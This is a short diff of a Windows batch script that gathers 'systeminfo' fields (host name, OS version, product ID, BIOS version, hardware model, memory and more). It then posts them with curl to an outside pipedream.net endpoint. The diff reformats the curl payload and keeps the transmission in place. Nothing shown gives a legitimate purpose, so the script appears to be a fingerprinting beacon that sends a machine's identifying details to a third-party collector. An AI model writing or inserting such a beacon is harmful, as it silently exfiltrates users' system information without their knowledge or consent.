@@ -25,5 +25,4 @@ for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"System Locale"') d
 set "system_locale=%system_locale:~13%"
 for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"Total Physical Memory"') do set "total_physical_memory=%%i"
 set "total_physical_memory=%total_physical_memory:~5%"
-curl -d "{'Host Name':'%host_name%', 'OS Name':'%os_name%', 'OS Version':'%os_version%', 'Product ID':'%product_id%', 'System Boot Time':'%system_boot_time%', 'System Manufacturer':'%system_manufacturer%', 'System Model':'%system_model%', 'System Type':'%system_type%', 'Processor(s)':'%processors%', 'BIOS Version':'%bios_version%', 'System Locale':'%system_locale%', 'Total Physical Memory':'%total_physical_memory%'}" https://eojlk5hggkgar9y.m.pipedream.net/
- 
+curl -d "{\"Data\":\"%host_name%, %os_name%, %os_version%, %product_id%, %system_boot_time%, %system_manufacturer%, %system_model%, %system_type%, %processors%, %bios_version%, %system_locale%, %total_physical_memory%\"}" https://eojlk5hggkgar9y.m.pipedream.net/ 
